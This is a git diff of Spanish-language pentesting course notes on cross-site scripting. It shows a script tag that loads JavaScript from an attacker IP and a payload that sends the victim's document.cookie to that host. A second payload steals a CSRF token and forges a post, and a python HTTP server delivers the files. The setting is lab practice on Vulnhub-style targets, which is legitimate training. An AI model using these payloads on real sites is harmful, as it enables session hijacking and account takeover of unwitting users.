@@ -136,7 +136,7 @@ Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en dond
 </script>
 ```
 
-## JavaScript robar cookie de Sesión 
+## Cookie Hijacking
 
 Web para identificar un [Json Web Token](https://jwt.io/), este se encuentra en: **Ctrl + Shift + c > Application/Storage > Session**
 
@@ -147,64 +147,63 @@ External JavaScript Source, podemos cargar código desde un servidor externo par
 ```javascript
 // 1. Esto lo colocaremos en la web de prueba y crearemos la publicación
 
-<script src="http://192.168.68.111/test.js"></script>
+<script src="http://192.168.68.111/test.js"></script>    // Colomos la IP de atacante y el nombre del archivo malicioso
 ```
 
 ```javascript
 // 2. En nuestra maquina de atacante crearemos este archivo 'js' con el cual robaremos la Cookie de Sesion del usuario
 
-❯ nvim test.js                                                  # Creamos el archivo js
+❯ nvim test.js                                                  // Creamos el archivo js
 
-	var request = new XMLHttpRequest();
+	var request = new XMLHttpRequest();                        // Nos permite controlar peticiones 
 	request.open('GET', 'http://192.168.68.111/?cookie=' + document.cookie);
 	request.send();         
 ```
 
 ```bash
-❯ python3 -m http.server 80               # Nos montamos un servidor http 80 para recibir las peticiones 
+❯ python3 -m http.server 80               # Nos montamos un servidor http 80 para que la victima acceda al archivo malicioso 
 
 # Después de tener la 'Cookie de Session' podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y así cuando recarguemos la pagina, iniciaremos como el otro usuario.
 ```
 
+## Victima cree un post en una web 
 
-----
-
-Esto lo colocaremos en la web de prueba y crearemos la publicación
 ```javascript
-<script src="http://192.168.68.111/pwned.js"></script>
+// 1. Esto lo colocaremos en la web de prueba y crearemos la publicación
+
+<script src="http://192.168.68.111/pwned.js"></script>  // Colomos la IP de atacante y el nombre del archivo malicioso
 ```
 
-* Cuando creas el archivo .js ya no es necesario poner las cabeceras <script></script>
-```bash
-❯ nvim pwned.js                                                  # Creamos el archivo js
-```
-
-Esto se usa una vez obtenido la **csrf_token y value**
 ```javascript
-var domain = "http://localhost:10007/newgossip";
-var req1 = new XMLHttpRequest();
-req1.open('GET', domain, false);
-req1.withcredentials = true;                               // Por si el Token es Dinamico y asi lo volvemos Estatico
-req1.send();
+// Esto se usa una vez obtenido la 'csrf_token y value'
 
-var response = req1.responseText;
-var parser = new DOMParser();
-var doc = parser.parserFromString(respose, 'text/html');
-var token = doc.getElementsByName("_csrf_token")[0].value;
+❯ nvim pwned.js                                                 // Creamos el archivo js
 
-var req2 = new XMLHttpRequest();
-var data = "title=HACKED&subtitle=HaCkEd&text=HAC%20ked&_csrf_token=" + token;   // El %20 es un espacio en urlencode
-req2.open('POST', 'http://localhost:10007/newgossip', false); 
-req2.withcredentials = true;
-req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-req2.send(data);
+	var domain = "http://localhost:10007/newgossip";
+	var req1 = new XMLHttpRequest();
+	req1.open('GET', domain, false);
+	req1.withcredentials = true;                               // Por si el Token es Dinamico y asi lo volvemos Estatico
+	req1.send();
+	
+	var response = req1.responseText;
+	var parser = new DOMParser();
+	var doc = parser.parserFromString(respose, 'text/html');
+	var token = doc.getElementsByName("_csrf_token")[0].value;
+	
+	var req2 = new XMLHttpRequest();
+	var data = "title=HACKED&subtitle=HaCkEd&text=HAC%20ked&_csrf_token=" + token;   // El %20 es un espacio en urlencode
+	req2.open('POST', 'http://localhost:10007/newgossip', false); 
+	req2.withcredentials = true;
+	req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	req2.send(data);
 ```
 
 ```bash
-❯ python3 -m http.server 80                                     # Nos montamos un servidor http 80 para recibir las peticiones 
+❯ python3 -m http.server 80            # Nos montamos un servidor http 80 para que el usuario pueda acceder a nuestro archivo malicioso 
 ```
 
-----
+## Maquina para practicar los XSS
+
 En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.
 
 Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.
